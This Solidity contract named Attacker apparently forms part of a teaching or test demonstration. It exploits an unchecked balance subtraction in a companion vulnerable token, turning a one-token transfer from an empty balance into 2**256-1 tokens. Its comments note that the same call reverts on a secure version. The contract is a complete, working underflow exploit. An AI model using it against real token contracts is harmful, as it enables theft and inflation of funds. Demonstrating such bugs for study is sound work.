// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IRewardToken} from "./IRewardToken.sol";

/**
 * @title Attacker
 * @notice Inflates its balance for free via the unchecked subtraction in
 *         {VulnerableToken-transfer}.
 * @dev The attacker holds nothing. `attack()` transfers a single token it does
 *      not own. On the vulnerable token the subtraction wraps, leaving this
 *      contract with `2**256 - 1` tokens conjured out of an empty balance. On
 *      the secure token the same call reverts with a Panic arithmetic error and
 *      the balance stays at zero.
 */
contract Attacker {
    /// @notice Token being attacked.
    IRewardToken public immutable token;

    /// @notice Destination of the overflowing transfer (the deployer).
    address public immutable recipient;

    /**
     * @param target address of the token to attack
     */
    constructor(address target) {
        token = IRewardToken(target);
        recipient = msg.sender;
    }

    /**
     * @notice Transfer a token this contract does not own, underflowing the
     *         sender's balance on the vulnerable token.
     */
    function attack() external {
        // The attacker ignores the boolean: the transfer's silent "success" on
        // the vulnerable token is the entire point.
        // forge-lint: disable-next-line(erc20-unchecked-transfer)
        token.transfer(recipient, 1);
    }

    /// @notice Tokens this contract conjured from nothing.
    function profit() external view returns (uint256) {
        return token.balanceOf(address(this));
    }
}
